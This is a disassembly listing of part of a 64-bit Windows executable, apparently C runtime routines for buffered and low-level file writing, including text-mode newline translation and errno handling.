   140005e76:	8b 4b 18             	mov    0x18(%rbx),%ecx
   140005e79:	48 63 f0             	movslq %eax,%rsi
   140005e7c:	f6 c1 82             	test   $0x82,%cl
   140005e7f:	75 17                	jne    0x140005e98
   140005e81:	e8 f2 e6 ff ff       	call   0x140004578
   140005e86:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140005e8c:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   140005e90:	83 c8 ff             	or     $0xffffffff,%eax
   140005e93:	e9 32 01 00 00       	jmp    0x140005fca
   140005e98:	f6 c1 40             	test   $0x40,%cl
   140005e9b:	74 0d                	je     0x140005eaa
   140005e9d:	e8 d6 e6 ff ff       	call   0x140004578
   140005ea2:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   140005ea8:	eb e2                	jmp    0x140005e8c
   140005eaa:	33 ff                	xor    %edi,%edi
   140005eac:	f6 c1 01             	test   $0x1,%cl
   140005eaf:	74 19                	je     0x140005eca
   140005eb1:	89 7b 08             	mov    %edi,0x8(%rbx)
   140005eb4:	f6 c1 10             	test   $0x10,%cl
   140005eb7:	0f 84 89 00 00 00    	je     0x140005f46
   140005ebd:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140005ec1:	83 e1 fe             	and    $0xfffffffe,%ecx
   140005ec4:	48 89 03             	mov    %rax,(%rbx)
   140005ec7:	89 4b 18             	mov    %ecx,0x18(%rbx)
   140005eca:	8b 43 18             	mov    0x18(%rbx),%eax
   140005ecd:	89 7b 08             	mov    %edi,0x8(%rbx)
   140005ed0:	83 e0 ef             	and    $0xffffffef,%eax
   140005ed3:	83 c8 02             	or     $0x2,%eax
   140005ed6:	89 43 18             	mov    %eax,0x18(%rbx)
   140005ed9:	a9 0c 01 00 00       	test   $0x10c,%eax
   140005ede:	75 2f                	jne    0x140005f0f
   140005ee0:	e8 8f e3 ff ff       	call   0x140004274
   140005ee5:	48 83 c0 30          	add    $0x30,%rax
   140005ee9:	48 3b d8             	cmp    %rax,%rbx
   140005eec:	74 0e                	je     0x140005efc
   140005eee:	e8 81 e3 ff ff       	call   0x140004274
   140005ef3:	48 83 c0 60          	add    $0x60,%rax
   140005ef7:	48 3b d8             	cmp    %rax,%rbx
   140005efa:	75 0b                	jne    0x140005f07
   140005efc:	8b ce                	mov    %esi,%ecx
   140005efe:	e8 05 2e 00 00       	call   0x140008d08
   140005f03:	85 c0                	test   %eax,%eax
   140005f05:	75 08                	jne    0x140005f0f
   140005f07:	48 8b cb             	mov    %rbx,%rcx
   140005f0a:	e8 c5 3e 00 00       	call   0x140009dd4
   140005f0f:	f7 43 18 08 01 00 00 	testl  $0x108,0x18(%rbx)
   140005f16:	0f 84 8b 00 00 00    	je     0x140005fa7
   140005f1c:	8b 2b                	mov    (%rbx),%ebp
   140005f1e:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140005f22:	2b 6b 10             	sub    0x10(%rbx),%ebp
   140005f25:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140005f29:	48 89 03             	mov    %rax,(%rbx)
   140005f2c:	8b 43 24             	mov    0x24(%rbx),%eax
   140005f2f:	ff c8                	dec    %eax
   140005f31:	89 43 08             	mov    %eax,0x8(%rbx)
   140005f34:	85 ed                	test   %ebp,%ebp
   140005f36:	7e 19                	jle    0x140005f51
   140005f38:	44 8b c5             	mov    %ebp,%r8d
   140005f3b:	8b ce                	mov    %esi,%ecx
   140005f3d:	e8 9e 00 00 00       	call   0x140005fe0
   140005f42:	8b f8                	mov    %eax,%edi
   140005f44:	eb 55                	jmp    0x140005f9b
   140005f46:	83 c9 20             	or     $0x20,%ecx
   140005f49:	89 4b 18             	mov    %ecx,0x18(%rbx)
   140005f4c:	e9 3f ff ff ff       	jmp    0x140005e90
   140005f51:	8d 46 02             	lea    0x2(%rsi),%eax
   140005f54:	83 f8 01             	cmp    $0x1,%eax
   140005f57:	76 1e                	jbe    0x140005f77
   140005f59:	48 8b ce             	mov    %rsi,%rcx
   140005f5c:	48 8b c6             	mov    %rsi,%rax
   140005f5f:	4c 8d 05 aa 4f 01 00 	lea    0x14faa(%rip),%r8        # 0x14001af10
   140005f66:	83 e1 1f             	and    $0x1f,%ecx
   140005f69:	48 c1 f8 05          	sar    $0x5,%rax
   140005f6d:	48 6b d1 58          	imul   $0x58,%rcx,%rdx
   140005f71:	49 03 14 c0          	add    (%r8,%rax,8),%rdx
   140005f75:	eb 07                	jmp    0x140005f7e
   140005f77:	48 8d 15 e2 35 01 00 	lea    0x135e2(%rip),%rdx        # 0x140019560
   140005f7e:	f6 42 08 20          	testb  $0x20,0x8(%rdx)
   140005f82:	74 17                	je     0x140005f9b
   140005f84:	33 d2                	xor    %edx,%edx
   140005f86:	8b ce                	mov    %esi,%ecx
   140005f88:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   140005f8c:	e8 c7 3c 00 00       	call   0x140009c58
   140005f91:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140005f95:	0f 84 f1 fe ff ff    	je     0x140005e8c
   140005f9b:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140005f9f:	8a 44 24 30          	mov    0x30(%rsp),%al
   140005fa3:	88 01                	mov    %al,(%rcx)
   140005fa5:	eb 16                	jmp    0x140005fbd
   140005fa7:	bd 01 00 00 00       	mov    $0x1,%ebp
   140005fac:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140005fb1:	8b ce                	mov    %esi,%ecx
   140005fb3:	44 8b c5             	mov    %ebp,%r8d
   140005fb6:	e8 25 00 00 00       	call   0x140005fe0
   140005fbb:	8b f8                	mov    %eax,%edi
   140005fbd:	3b fd                	cmp    %ebp,%edi
   140005fbf:	0f 85 c7 fe ff ff    	jne    0x140005e8c
   140005fc5:	0f b6 44 24 30       	movzbl 0x30(%rsp),%eax
   140005fca:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140005fcf:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140005fd4:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140005fd9:	48 83 c4 20          	add    $0x20,%rsp
   140005fdd:	5f                   	pop    %rdi
   140005fde:	c3                   	ret
   140005fdf:	cc                   	int3
   140005fe0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005fe5:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140005fe9:	56                   	push   %rsi
   140005fea:	57                   	push   %rdi
   140005feb:	41 54                	push   %r12
   140005fed:	41 56                	push   %r14
   140005fef:	41 57                	push   %r15
   140005ff1:	48 83 ec 20          	sub    $0x20,%rsp
   140005ff5:	41 8b f0             	mov    %r8d,%esi
   140005ff8:	4c 8b f2             	mov    %rdx,%r14
   140005ffb:	48 63 d9             	movslq %ecx,%rbx
   140005ffe:	83 fb fe             	cmp    $0xfffffffe,%ebx
   140006001:	75 18                	jne    0x14000601b
   140006003:	e8 00 e5 ff ff       	call   0x140004508
   140006008:	83 20 00             	andl   $0x0,(%rax)
   14000600b:	e8 68 e5 ff ff       	call   0x140004578
   140006010:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140006016:	e9 91 00 00 00       	jmp    0x1400060ac
   14000601b:	85 c9                	test   %ecx,%ecx
   14000601d:	78 75                	js     0x140006094
   14000601f:	3b 1d 3b 5c 01 00    	cmp    0x15c3b(%rip),%ebx        # 0x14001bc60
   140006025:	73 6d                	jae    0x140006094
   140006027:	48 8b c3             	mov    %rbx,%rax
   14000602a:	48 8b fb             	mov    %rbx,%rdi
   14000602d:	48 c1 ff 05          	sar    $0x5,%rdi
   140006031:	4c 8d 25 d8 4e 01 00 	lea    0x14ed8(%rip),%r12        # 0x14001af10
   140006038:	83 e0 1f             	and    $0x1f,%eax
   14000603b:	4c 6b f8 58          	imul   $0x58,%rax,%r15
   14000603f:	49 8b 04 fc          	mov    (%r12,%rdi,8),%rax
   140006043:	42 0f be 4c 38 08    	movsbl 0x8(%rax,%r15,1),%ecx
   140006049:	83 e1 01             	and    $0x1,%ecx
   14000604c:	74 46                	je     0x140006094
   14000604e:	8b cb                	mov    %ebx,%ecx
   140006050:	e8 f7 21 00 00       	call   0x14000824c
   140006055:	90                   	nop
   140006056:	49 8b 04 fc          	mov    (%r12,%rdi,8),%rax
   14000605a:	42 f6 44 38 08 01    	testb  $0x1,0x8(%rax,%r15,1)
   140006060:	74 11                	je     0x140006073
   140006062:	44 8b c6             	mov    %esi,%r8d
   140006065:	49 8b d6             	mov    %r14,%rdx
   140006068:	8b cb                	mov    %ebx,%ecx
   14000606a:	e8 55 00 00 00       	call   0x1400060c4
   14000606f:	8b f8                	mov    %eax,%edi
   140006071:	eb 16                	jmp    0x140006089
   140006073:	e8 00 e5 ff ff       	call   0x140004578
   140006078:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000607e:	e8 85 e4 ff ff       	call   0x140004508
   140006083:	83 20 00             	andl   $0x0,(%rax)
   140006086:	83 cf ff             	or     $0xffffffff,%edi
   140006089:	8b cb                	mov    %ebx,%ecx
   14000608b:	e8 1c 26 00 00       	call   0x1400086ac
   140006090:	8b c7                	mov    %edi,%eax
   140006092:	eb 1b                	jmp    0x1400060af
   140006094:	e8 6f e4 ff ff       	call   0x140004508
   140006099:	83 20 00             	andl   $0x0,(%rax)
   14000609c:	e8 d7 e4 ff ff       	call   0x140004578
   1400060a1:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400060a7:	e8 7c e0 ff ff       	call   0x140004128
   1400060ac:	83 c8 ff             	or     $0xffffffff,%eax
   1400060af:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   1400060b4:	48 83 c4 20          	add    $0x20,%rsp
   1400060b8:	41 5f                	pop    %r15
   1400060ba:	41 5e                	pop    %r14
   1400060bc:	41 5c                	pop    %r12
   1400060be:	5f                   	pop    %rdi
   1400060bf:	5e                   	pop    %rsi
   1400060c0:	c3                   	ret
   1400060c1:	cc                   	int3
   1400060c2:	cc                   	int3
   1400060c3:	cc                   	int3
   1400060c4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400060c9:	55                   	push   %rbp
   1400060ca:	56                   	push   %rsi
   1400060cb:	57                   	push   %rdi
   1400060cc:	41 54                	push   %r12
   1400060ce:	41 55                	push   %r13
   1400060d0:	41 56                	push   %r14
   1400060d2:	41 57                	push   %r15
   1400060d4:	48 8d ac 24 c0 e5 ff 	lea    -0x1a40(%rsp),%rbp
   1400060db:	ff 
   1400060dc:	b8 40 1b 00 00       	mov    $0x1b40,%eax
   1400060e1:	e8 0a 3f 00 00       	call   0x140009ff0
   1400060e6:	48 2b e0             	sub    %rax,%rsp
   1400060e9:	48 8b 05 10 2f 01 00 	mov    0x12f10(%rip),%rax        # 0x140019000
   1400060f0:	48 33 c4             	xor    %rsp,%rax
   1400060f3:	48 89 85 30 1a 00 00 	mov    %rax,0x1a30(%rbp)
   1400060fa:	45 33 e4             	xor    %r12d,%r12d
   1400060fd:	45 8b f8             	mov    %r8d,%r15d
   140006100:	4c 8b f2             	mov    %rdx,%r14
   140006103:	48 63 f9             	movslq %ecx,%rdi
   140006106:	44 89 64 24 40       	mov    %r12d,0x40(%rsp)
   14000610b:	41 8b dc             	mov    %r12d,%ebx
   14000610e:	41 8b f4             	mov    %r12d,%esi
   140006111:	45 85 c0             	test   %r8d,%r8d
   140006114:	75 07                	jne    0x14000611d
   140006116:	33 c0                	xor    %eax,%eax
   140006118:	e9 6e 07 00 00       	jmp    0x14000688b
   14000611d:	48 85 d2             	test   %rdx,%rdx
   140006120:	75 20                	jne    0x140006142
   140006122:	e8 e1 e3 ff ff       	call   0x140004508
   140006127:	44 89 20             	mov    %r12d,(%rax)
   14000612a:	e8 49 e4 ff ff       	call   0x140004578
   14000612f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140006135:	e8 ee df ff ff       	call   0x140004128
   14000613a:	83 c8 ff             	or     $0xffffffff,%eax
   14000613d:	e9 49 07 00 00       	jmp    0x14000688b
   140006142:	48 8b c7             	mov    %rdi,%rax
   140006145:	48 8b cf             	mov    %rdi,%rcx
   140006148:	48 8d 15 c1 4d 01 00 	lea    0x14dc1(%rip),%rdx        # 0x14001af10
   14000614f:	48 c1 f9 05          	sar    $0x5,%rcx
   140006153:	83 e0 1f             	and    $0x1f,%eax
   140006156:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   14000615b:	48 8b 0c ca          	mov    (%rdx,%rcx,8),%rcx
   14000615f:	4c 6b e8 58          	imul   $0x58,%rax,%r13
   140006163:	45 8a 64 0d 38       	mov    0x38(%r13,%rcx,1),%r12b
   140006168:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   14000616d:	45 02 e4             	add    %r12b,%r12b
   140006170:	41 d0 fc             	sar    $1,%r12b
   140006173:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   140006178:	3c 01                	cmp    $0x1,%al
   14000617a:	77 14                	ja     0x140006190
   14000617c:	41 8b c7             	mov    %r15d,%eax
   14000617f:	f7 d0                	not    %eax
   140006181:	a8 01                	test   $0x1,%al
   140006183:	75 0b                	jne    0x140006190
   140006185:	e8 7e e3 ff ff       	call   0x140004508
   14000618a:	33 c9                	xor    %ecx,%ecx
   14000618c:	89 08                	mov    %ecx,(%rax)
   14000618e:	eb 9a                	jmp    0x14000612a
   140006190:	41 f6 44 0d 08 20    	testb  $0x20,0x8(%r13,%rcx,1)
   140006196:	74 0d                	je     0x1400061a5
   140006198:	33 d2                	xor    %edx,%edx
   14000619a:	8b cf                	mov    %edi,%ecx
   14000619c:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   1400061a0:	e8 9b 3b 00 00       	call   0x140009d40
   1400061a5:	8b cf                	mov    %edi,%ecx
   1400061a7:	e8 5c 2b 00 00       	call   0x140008d08
   1400061ac:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400061b1:	85 c0                	test   %eax,%eax
   1400061b3:	0f 84 40 03 00 00    	je     0x1400064f9
   1400061b9:	48 8d 05 50 4d 01 00 	lea    0x14d50(%rip),%rax        # 0x14001af10
   1400061c0:	48 8b 04 f8          	mov    (%rax,%rdi,8),%rax
   1400061c4:	41 f6 44 05 08 80    	testb  $0x80,0x8(%r13,%rax,1)
   1400061ca:	0f 84 29 03 00 00    	je     0x1400064f9
   1400061d0:	e8 e3 09 00 00       	call   0x140006bb8
   1400061d5:	48 8d 54 24 64       	lea    0x64(%rsp),%rdx
   1400061da:	48 8b 88 c0 00 00 00 	mov    0xc0(%rax),%rcx
   1400061e1:	33 c0                	xor    %eax,%eax
   1400061e3:	48 39 81 38 01 00 00 	cmp    %rax,0x138(%rcx)
   1400061ea:	8b f8                	mov    %eax,%edi
   1400061ec:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400061f1:	48 8d 0d 18 4d 01 00 	lea    0x14d18(%rip),%rcx        # 0x14001af10
   1400061f8:	40 0f 94 c7          	sete   %dil
   1400061fc:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   140006200:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   140006205:	ff 15 85 af 00 00    	call   *0xaf85(%rip)        # 0x140011190
   14000620b:	33 c9                	xor    %ecx,%ecx
   14000620d:	85 c0                	test   %eax,%eax
   14000620f:	0f 84 df 02 00 00    	je     0x1400064f4
   140006215:	33 c0                	xor    %eax,%eax
   140006217:	85 ff                	test   %edi,%edi
   140006219:	74 09                	je     0x140006224
   14000621b:	45 84 e4             	test   %r12b,%r12b
   14000621e:	0f 84 c9 02 00 00    	je     0x1400064ed
   140006224:	ff 15 5e af 00 00    	call   *0xaf5e(%rip)        # 0x140011188
   14000622a:	49 8b fe             	mov    %r14,%rdi
   14000622d:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140006231:	33 c0                	xor    %eax,%eax
   140006233:	0f b7 c8             	movzwl %ax,%ecx
   140006236:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   14000623b:	89 44 24 60          	mov    %eax,0x60(%rsp)
   14000623f:	45 85 ff             	test   %r15d,%r15d
   140006242:	0f 84 06 06 00 00    	je     0x14000684e
   140006248:	44 8b e8             	mov    %eax,%r13d
   14000624b:	45 84 e4             	test   %r12b,%r12b
   14000624e:	0f 85 a3 01 00 00    	jne    0x1400063f7
   140006254:	8a 0f                	mov    (%rdi),%cl
   140006256:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   14000625b:	48 8d 15 ae 4c 01 00 	lea    0x14cae(%rip),%rdx        # 0x14001af10
   140006262:	80 f9 0a             	cmp    $0xa,%cl
   140006265:	0f 94 c0             	sete   %al
   140006268:	45 33 c0             	xor    %r8d,%r8d
   14000626b:	89 44 24 64          	mov    %eax,0x64(%rsp)
   14000626f:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140006274:	48 8b 14 c2          	mov    (%rdx,%rax,8),%rdx
   140006278:	45 39 44 15 50       	cmp    %r8d,0x50(%r13,%rdx,1)
   14000627d:	74 1f                	je     0x14000629e
   14000627f:	41 8a 44 15 4c       	mov    0x4c(%r13,%rdx,1),%al
   140006284:	88 4c 24 6d          	mov    %cl,0x6d(%rsp)
   140006288:	88 44 24 6c          	mov    %al,0x6c(%rsp)
   14000628c:	45 89 44 15 50       	mov    %r8d,0x50(%r13,%rdx,1)
   140006291:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006297:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   14000629c:	eb 49                	jmp    0x1400062e7
   14000629e:	0f be c9             	movsbl %cl,%ecx
   1400062a1:	e8 76 37 00 00       	call   0x140009a1c
   1400062a6:	85 c0                	test   %eax,%eax
   1400062a8:	74 34                	je     0x1400062de
   1400062aa:	49 8b c7             	mov    %r15,%rax
   1400062ad:	48 2b c7             	sub    %rdi,%rax
   1400062b0:	49 03 c6             	add    %r14,%rax
   1400062b3:	48 83 f8 01          	cmp    $0x1,%rax
   1400062b7:	0f 8e b3 01 00 00    	jle    0x140006470
   1400062bd:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   1400062c2:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400062c8:	48 8b d7             	mov    %rdi,%rdx
   1400062cb:	e8 ac 3c 00 00       	call   0x140009f7c
   1400062d0:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400062d3:	0f 84 d9 01 00 00    	je     0x1400064b2
   1400062d9:	48 ff c7             	inc    %rdi
   1400062dc:	eb 1c                	jmp    0x1400062fa
   1400062de:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400062e4:	48 8b d7             	mov    %rdi,%rdx
   1400062e7:	48 8d 4c 24 44       	lea    0x44(%rsp),%rcx
   1400062ec:	e8 8b 3c 00 00       	call   0x140009f7c
   1400062f1:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400062f4:	0f 84 b8 01 00 00    	je     0x1400064b2
   1400062fa:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   1400062fe:	33 c0                	xor    %eax,%eax
   140006300:	4c 8d 44 24 44       	lea    0x44(%rsp),%r8
   140006305:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000630a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000630f:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   140006314:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   14000631a:	33 d2                	xor    %edx,%edx
   14000631c:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   140006323:	00 
   140006324:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140006329:	48 ff c7             	inc    %rdi
   14000632c:	ff 15 4e ae 00 00    	call   *0xae4e(%rip)        # 0x140011180
   140006332:	44 8b e8             	mov    %eax,%r13d
   140006335:	85 c0                	test   %eax,%eax
   140006337:	0f 84 70 01 00 00    	je     0x1400064ad
   14000633d:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140006342:	48 8d 0d c7 4b 01 00 	lea    0x14bc7(%rip),%rcx        # 0x14001af10
   140006349:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   14000634e:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   140006352:	33 c0                	xor    %eax,%eax
   140006354:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   140006359:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000635e:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140006363:	45 8b c5             	mov    %r13d,%r8d
   140006366:	48 8b 0c 08          	mov    (%rax,%rcx,1),%rcx
   14000636a:	ff 15 08 ae 00 00    	call   *0xae08(%rip)        # 0x140011178
   140006370:	85 c0                	test   %eax,%eax
   140006372:	0f 84 2d 01 00 00    	je     0x1400064a5
   140006378:	8b 44 24 40          	mov    0x40(%rsp),%eax
   14000637c:	8b df                	mov    %edi,%ebx
   14000637e:	41 2b de             	sub    %r14d,%ebx
   140006381:	03 d8                	add    %eax,%ebx
   140006383:	44 39 6c 24 60       	cmp    %r13d,0x60(%rsp)
   140006388:	0f 8c a5 04 00 00    	jl     0x140006833
   14000638e:	45 33 ed             	xor    %r13d,%r13d
   140006391:	44 39 6c 24 64       	cmp    %r13d,0x64(%rsp)
   140006396:	74 58                	je     0x1400063f0
   140006398:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000639d:	45 8d 45 01          	lea    0x1(%r13),%r8d
   1400063a1:	c6 44 24 6c 0d       	movb   $0xd,0x6c(%rsp)
   1400063a6:	48 8d 0d 63 4b 01 00 	lea    0x14b63(%rip),%rcx        # 0x14001af10
   1400063ad:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   1400063b2:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   1400063b7:	48 8b 0c c1          	mov    (%rcx,%rax,8),%rcx
   1400063bb:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1400063c0:	48 8d 54 24 6c       	lea    0x6c(%rsp),%rdx
   1400063c5:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   1400063ca:	ff 15 a8 ad 00 00    	call   *0xada8(%rip)        # 0x140011178
   1400063d0:	85 c0                	test   %eax,%eax
   1400063d2:	0f 84 c3 00 00 00    	je     0x14000649b
   1400063d8:	83 7c 24 60 01       	cmpl   $0x1,0x60(%rsp)
   1400063dd:	0f 8c cf 00 00 00    	jl     0x1400064b2
   1400063e3:	ff 44 24 40          	incl   0x40(%rsp)
   1400063e7:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   1400063ec:	ff c3                	inc    %ebx
   1400063ee:	eb 6f                	jmp    0x14000645f
   1400063f0:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   1400063f5:	eb 63                	jmp    0x14000645a
   1400063f7:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   1400063fc:	3c 01                	cmp    $0x1,%al
   1400063fe:	77 19                	ja     0x140006419
   140006400:	0f b7 0f             	movzwl (%rdi),%ecx
   140006403:	33 c0                	xor    %eax,%eax
   140006405:	66 83 f9 0a          	cmp    $0xa,%cx
   140006409:	44 8b e8             	mov    %eax,%r13d
   14000640c:	66 89 4c 24 44       	mov    %cx,0x44(%rsp)
   140006411:	41 0f 94 c5          	sete   %r13b
   140006415:	48 83 c7 02          	add    $0x2,%rdi
   140006419:	41 8d 44 24 ff       	lea    -0x1(%r12),%eax
   14000641e:	3c 01                	cmp    $0x1,%al
   140006420:	77 38                	ja     0x14000645a
   140006422:	e8 5d 3b 00 00       	call   0x140009f84
   140006427:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   14000642c:	66 3b c1             	cmp    %cx,%ax
   14000642f:	75 74                	jne    0x1400064a5
   140006431:	83 c3 02             	add    $0x2,%ebx
   140006434:	45 85 ed             	test   %r13d,%r13d
   140006437:	74 21                	je     0x14000645a
   140006439:	b8 0d 00 00 00       	mov    $0xd,%eax
   14000643e:	8b c8                	mov    %eax,%ecx
   140006440:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   140006445:	e8 3a 3b 00 00       	call   0x140009f84
   14000644a:	0f b7 4c 24 44       	movzwl 0x44(%rsp),%ecx
   14000644f:	66 3b c1             	cmp    %cx,%ax
   140006452:	75 51                	jne    0x1400064a5
   140006454:	ff c3                	inc    %ebx
   140006456:	ff 44 24 40          	incl   0x40(%rsp)
   14000645a:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   14000645f:	8b c7                	mov    %edi,%eax
   140006461:	41 2b c6             	sub    %r14d,%eax
   140006464:	41 3b c7             	cmp    %r15d,%eax
   140006467:	73 49                	jae    0x1400064b2
   140006469:	33 c0                	xor    %eax,%eax
   14000646b:	e9 d8 fd ff ff       	jmp    0x140006248
   140006470:	8a 07                	mov    (%rdi),%al
   140006472:	4c 8b 7c 24 48       	mov    0x48(%rsp),%r15
   140006477:	4c 8d 25 92 4a 01 00 	lea    0x14a92(%rip),%r12        # 0x14001af10
   14000647e:	4b 8b 0c fc          	mov    (%r12,%r15,8),%rcx
   140006482:	ff c3                	inc    %ebx
   140006484:	49 8b ff             	mov    %r15,%rdi
   140006487:	41 88 44 0d 4c       	mov    %al,0x4c(%r13,%rcx,1)
   14000648c:	4b 8b 04 fc          	mov    (%r12,%r15,8),%rax
   140006490:	41 c7 44 05 50 01 00 	movl   $0x1,0x50(%r13,%rax,1)
   140006497:	00 00 
   140006499:	eb 1c                	jmp    0x1400064b7
   14000649b:	ff 15 ef ab 00 00    	call   *0xabef(%rip)        # 0x140011090
   1400064a1:	8b f0                	mov    %eax,%esi
   1400064a3:	eb 0d                	jmp    0x1400064b2
   1400064a5:	ff 15 e5 ab 00 00    	call   *0xabe5(%rip)        # 0x140011090
   1400064ab:	8b f0                	mov    %eax,%esi
   1400064ad:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   1400064b2:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400064b7:	8b 44 24 40          	mov    0x40(%rsp),%eax
   1400064bb:	85 db                	test   %ebx,%ebx
   1400064bd:	0f 85 c4 03 00 00    	jne    0x140006887
   1400064c3:	33 db                	xor    %ebx,%ebx
   1400064c5:	85 f6                	test   %esi,%esi
   1400064c7:	0f 84 86 03 00 00    	je     0x140006853
   1400064cd:	83 fe 05             	cmp    $0x5,%esi
   1400064d0:	0f 85 6c 03 00 00    	jne    0x140006842
   1400064d6:	e8 9d e0 ff ff       	call   0x140004578
   1400064db:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400064e1:	e8 22 e0 ff ff       	call   0x140004508
   1400064e6:	89 30                	mov    %esi,(%rax)
   1400064e8:	e9 4d fc ff ff       	jmp    0x14000613a
   1400064ed:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400064f2:	eb 07                	jmp    0x1400064fb
   1400064f4:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1400064f9:	33 c0                	xor    %eax,%eax
   1400064fb:	4c 8d 0d 0e 4a 01 00 	lea    0x14a0e(%rip),%r9        # 0x14001af10
   140006502:	49 8b 0c f9          	mov    (%r9,%rdi,8),%rcx
   140006506:	41 f6 44 0d 08 80    	testb  $0x80,0x8(%r13,%rcx,1)
   14000650c:	0f 84 e8 02 00 00    	je     0x1400067fa
   140006512:	8b f0                	mov    %eax,%esi
   140006514:	45 84 e4             	test   %r12b,%r12b
   140006517:	0f 85 d8 00 00 00    	jne    0x1400065f5
   14000651d:	4d 8b e6             	mov    %r14,%r12
   140006520:	45 85 ff             	test   %r15d,%r15d
   140006523:	0f 84 2a 03 00 00    	je     0x140006853
   140006529:	ba 0d 00 00 00       	mov    $0xd,%edx
   14000652e:	eb 02                	jmp    0x140006532
   140006530:	33 c0                	xor    %eax,%eax
   140006532:	44 8b 6c 24 40       	mov    0x40(%rsp),%r13d
   140006537:	48 8d bd 30 06 00 00 	lea    0x630(%rbp),%rdi
   14000653e:	48 8b c8             	mov    %rax,%rcx
   140006541:	41 8b c4             	mov    %r12d,%eax
   140006544:	41 2b c6             	sub    %r14d,%eax
   140006547:	41 3b c7             	cmp    %r15d,%eax
   14000654a:	73 27                	jae    0x140006573
   14000654c:	41 8a 04 24          	mov    (%r12),%al
   140006550:	49 ff c4             	inc    %r12
   140006553:	3c 0a                	cmp    $0xa,%al
   140006555:	75 0b                	jne    0x140006562
   140006557:	88 17                	mov    %dl,(%rdi)
   140006559:	41 ff c5             	inc    %r13d
   14000655c:	48 ff c7             	inc    %rdi
   14000655f:	48 ff c1             	inc    %rcx
   140006562:	48 ff c1             	inc    %rcx
   140006565:	88 07                	mov    %al,(%rdi)
   140006567:	48 ff c7             	inc    %rdi
   14000656a:	48 81 f9 ff 13 00 00 	cmp    $0x13ff,%rcx
   140006571:	72 ce                	jb     0x140006541
   140006573:	48 8d 85 30 06 00 00 	lea    0x630(%rbp),%rax
   14000657a:	44 8b c7             	mov    %edi,%r8d
   14000657d:	44 89 6c 24 40       	mov    %r13d,0x40(%rsp)
   140006582:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   140006587:	44 2b c0             	sub    %eax,%r8d
   14000658a:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000658f:	49 8b 0c c1          	mov    (%r9,%rax,8),%rcx
   140006593:	33 c0                	xor    %eax,%eax
   140006595:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   14000659a:	49 8b 4c 0d 00       	mov    0x0(%r13,%rcx,1),%rcx
   14000659f:	48 8d 95 30 06 00 00 	lea    0x630(%rbp),%rdx
   1400065a6:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400065ab:	ff 15 c7 ab 00 00    	call   *0xabc7(%rip)        # 0x140011178
   1400065b1:	85 c0                	test   %eax,%eax
